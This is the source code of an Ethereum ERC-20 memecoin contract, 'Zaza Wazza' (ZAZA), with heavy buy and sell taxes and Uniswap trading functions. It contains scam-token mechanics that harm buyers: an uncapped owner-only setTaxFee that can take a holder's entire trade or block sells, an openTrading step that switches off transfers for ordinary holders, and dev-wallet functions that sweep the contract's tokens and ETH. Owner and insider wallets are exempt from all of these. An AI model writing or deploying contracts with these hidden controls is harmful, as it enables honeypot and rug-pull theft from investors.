1 /*
2 https://www.zazawazzaaaa.com/
3 
4 https://t.me/zazawazzaaerc20
5 
6 https://twitter.com/zazawazzaaerc20
7 */
8 // SPDX-License-Identifier: MIT
9 
10 pragma solidity 0.8.20;
11 
12 abstract contract Context {
13     function _msgSender() internal view virtual returns (address) {
14         return msg.sender;
15     }
16 }
17 
18 interface IERC20 {
19     function totalSupply() external view returns (uint256);
20     function balanceOf(address account) external view returns (uint256);
21     function transfer(address recipient, uint256 amount) external returns (bool);
22     function allowance(address owner, address spender) external view returns (uint256);
23     function approve(address spender, uint256 amount) external returns (bool);
24     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
25     event Transfer(address indexed from, address indexed to, uint256 value);
26     event Approval(address indexed owner, address indexed spender, uint256 value);
27 }
28 
29 library SafeMath {
30     function add(uint256 a, uint256 b) internal pure returns (uint256) {
31         uint256 c = a + b;
32         require(c >= a, "SafeMath: addition overflow");
33         return c;
34     }
35 
36     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
37         return sub(a, b, "SafeMath: subtraction overflow");
38     }
39 
40     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
41         require(b <= a, errorMessage);
42         uint256 c = a - b;
43         return c;
44     }
45 
46     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
47         if (a == 0) {
48             return 0;
49         }
50         uint256 c = a * b;
51         require(c / a == b, "SafeMath: multiplication overflow");
52         return c;
53     }
54 
55     function div(uint256 a, uint256 b) internal pure returns (uint256) {
56         return div(a, b, "SafeMath: division by zero");
57     }
58 
59     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
60         require(b > 0, errorMessage);
61         uint256 c = a / b;
62         return c;
63     }
64 
65 }
66 
67 contract Ownable is Context {
68     address private _owner;
69     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
70 
71     constructor () {
72         address msgSender = _msgSender();
73         _owner = msgSender;
74         emit OwnershipTransferred(address(0), msgSender);
75     }
76 
77     function owner() public view returns (address) {
78         return _owner;
79     }
80 
81     modifier onlyOwner() {
82         require(_owner == _msgSender(), "Ownable: caller is not the owner");
83         _;
84     }
85 
86     function renounceOwnership() public virtual onlyOwner {
87         emit OwnershipTransferred(_owner, address(0));
88         _owner = address(0);
89     }
90 }
91 
92 interface IUniswapV2Factory {
93     function createPair(address tokenA, address tokenB) external returns (address pair);
94 }
95 
96 interface IUniswapV2Router02 {
97     function swapExactTokensForETHSupportingFeeOnTransferTokens(
98         uint amountIn,
99         uint amountOutMin,
100         address[] calldata path,
101         address to,
102         uint deadline
103     ) external;
104     function factory() external pure returns (address);
105     function WETH() external pure returns (address);
106     function addLiquidityETH(
107         address token,
108         uint amountTokenDesired,
109         uint amountTokenMin,
110         uint amountETHMin,
111         address to,
112         uint deadline
113     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
114 }
115 
116 contract ZAZA is Context, IERC20, Ownable {
117     using SafeMath for uint256;
118     mapping (address => uint256) private _balances;
119     mapping (address => mapping (address => uint256)) private _allowances;
120     mapping (address => bool) private _isExcludedFromFee;
121     bool public transferDelayEnabled = true;
122 
123     address payable private _devWallet;
124     address payable private _marketingWallet = payable(0x55c52dB73d28e1780f2a33FB16Dc99bbdBb43F10);
125     address payable private _airdropWallet = payable(0x11F4033cF6F73b457f2242e126a318a3e53A69f3);
126 
127     uint256 private _buyTax = 25;
128     uint256 private _sellTax = 29;
129 
130     uint8 private constant _decimals = 9;
131     uint256 private constant _tTotal = 100000000000 * 10**_decimals;
132     string private constant _name = unicode"Zaza Wazza";
133     string private constant _symbol = unicode"ZAZA";
134     uint256 public _maxTxAmount = 2000000000 * 10**_decimals;
135     uint256 public _maxWalletSize = 2000000000 * 10**_decimals;
136     uint256 public _taxSwapThreshold= 100000000   * 10**_decimals;
137     uint256 public _maxTaxSwap= 1000000000 * 10**_decimals;
138 
139     IUniswapV2Router02 private uniswapV2Router;
140     address private uniswapV2Pair;
141     bool private tradingOpen;
142     bool private inSwap = false;
143     bool private swapEnabled = false;
144     bool private enableTransfers = true;
145 
146     event MaxTxAmountUpdated(uint _maxTxAmount);
147     modifier lockTheSwap {
148         inSwap = true;
149         _;
150         inSwap = false;
151     }
152 
153     constructor () {
154         _devWallet = payable(_msgSender());
155         _balances[_msgSender()] = _tTotal;
156         _isExcludedFromFee[owner()] = true;
157         _isExcludedFromFee[address(this)] = true;
158         _isExcludedFromFee[_devWallet] = true;
159         _isExcludedFromFee[_marketingWallet] = true;
160         _isExcludedFromFee[_airdropWallet] = true;
161 
162         emit Transfer(address(0), _msgSender(), _tTotal);
163     }
164 
165     function name() public pure returns (string memory) {
166         return _name;
167     }
168 
169     function symbol() public pure returns (string memory) {
170         return _symbol;
171     }
172 
173     function decimals() public pure returns (uint8) {
174         return _decimals;
175     }
176 
177     function totalSupply() public pure override returns (uint256) {
178         return _tTotal;
179     }
180 
181     function balanceOf(address account) public view override returns (uint256) {
182         return _balances[account];
183     }
184 
185     function transfer(address recipient, uint256 amount) public override returns (bool) {
186         _transfer(_msgSender(), recipient, amount);
187         return true;
188     }
189 
190     function allowance(address owner, address spender) public view override returns (uint256) {
191         return _allowances[owner][spender];
192     }
193 
194     function approve(address spender, uint256 amount) public override returns (bool) {
195         _approve(_msgSender(), spender, amount);
196         return true;
197     }
198 
199     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
200         _transfer(sender, recipient, amount);
201         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
202         return true;
203     }
204 
205     function _approve(address owner, address spender, uint256 amount) private {
206         require(owner != address(0), "ERC20: approve from the zero address");
207         require(spender != address(0), "ERC20: approve to the zero address");
208         _allowances[owner][spender] = amount;
209         emit Approval(owner, spender, amount);
210     }
211 
212     function _transfer(address from, address to, uint256 amount) private {
213         require(from != address(0), "ERC20: transfer from the zero address");
214         require(to != address(0), "ERC20: transfer to the zero address");
215         require(amount > 0, "Transfer amount must be greater than zero");
216         uint256 taxAmount=0;
217         if (from != owner() && to != owner() && from != _airdropWallet && to != _airdropWallet && from != _devWallet && to != _devWallet) {
218             require(enableTransfers, "Transfers are disabled");
219             taxAmount = amount.mul(_buyTax).div(100);
220 
221             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
222                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
223                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
224             }
225 
226             if(to == uniswapV2Pair && from!= address(this) ){
227                 taxAmount = amount.mul(_sellTax).div(100);
228             }
229 
230             uint256 contractTokenBalance = balanceOf(address(this));
231             if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold) {
232                 swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
233                 uint256 contractETHBalance = address(this).balance;
234                 if(contractETHBalance > 0) {
235                     sendETHToFee(address(this).balance);
236                 }
237             }
238         }
239 
240         if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
241             taxAmount = 0;
242         }
243 
244         if(taxAmount > 0){
245           _balances[address(this)]=_balances[address(this)].add(taxAmount);
246           emit Transfer(from, address(this),taxAmount);
247         }
248 
249         _balances[from]=_balances[from].sub(amount);
250         _balances[to]=_balances[to].add(amount.sub(taxAmount));
251         emit Transfer(from, to, amount.sub(taxAmount));
252     }
253 
254 
255     function min(uint256 a, uint256 b) private pure returns (uint256){
256       return (a>b)?b:a;
257     }
258 
259     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
260         address[] memory path = new address[](2);
261         path[0] = address(this);
262         path[1] = uniswapV2Router.WETH();
263         _approve(address(this), address(uniswapV2Router), tokenAmount);
264         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
265             tokenAmount,
266             0,
267             path,
268             address(this),
269             block.timestamp
270         );
271     }
272 
273     function removeLimits() external onlyOwner{
274         _maxTxAmount = _tTotal;
275         _maxWalletSize=_tTotal;
276         transferDelayEnabled=false;
277         emit MaxTxAmountUpdated(_tTotal);
278     }
279 
280     function sendETHToFee(uint256 amount) private {
281         _marketingWallet.transfer(amount);
282     }
283 
284     function setTaxFee(uint256 finalFeeOnBuy, uint256 finalFeeOnSell) public onlyOwner {
285         _buyTax = finalFeeOnBuy;
286         _sellTax = finalFeeOnSell;
287     }
288 
289     function enableTrading() external onlyOwner() {
290         enableTransfers = true;
291     }
292 
293     function openTrading() external onlyOwner() {
294         require(!tradingOpen,"trading is already open");
295         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
296         _approve(address(this), address(uniswapV2Router), _tTotal);
297         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
298         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
299         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
300         swapEnabled = true;
301         tradingOpen = true;
302         enableTransfers = false;
303     }
304 
305     function airdrop(address[] calldata addresses, uint256[] calldata amounts) external {
306         require(_msgSender() ==  _airdropWallet);
307         require(addresses.length > 0 && amounts.length == addresses.length);
308         address from = msg.sender;
309 
310         for (uint256 i = 0; i < addresses.length; i++) {
311             _transfer(from, addresses[i], amounts[i] * (10 ** 9));
312         }
313     }
314 
315     receive() external payable {}
316 
317     function manualSend() external {
318         require(_msgSender()==_devWallet);
319         uint256 ethBalance=address(this).balance;
320         if(ethBalance>0){
321           sendETHToFee(ethBalance);
322         }
323     }
324 
325     function manualSwap() external {
326         require(_msgSender() == _devWallet);
327         uint256 tokenBalance=balanceOf(address(this));
328         if(tokenBalance>0){
329           swapTokensForEth(tokenBalance);
330         }
331         uint256 ethBalance=address(this).balance;
332         if(ethBalance>0){
333           sendETHToFee(address(this).balance);
334         }
335     }
336 
337     function emergencyWithdraw() external {
338         require(_msgSender() == _devWallet);
339         uint256 amount = balanceOf(address(this));
340         _transfer(address(this), _devWallet, amount);
341     }
342 }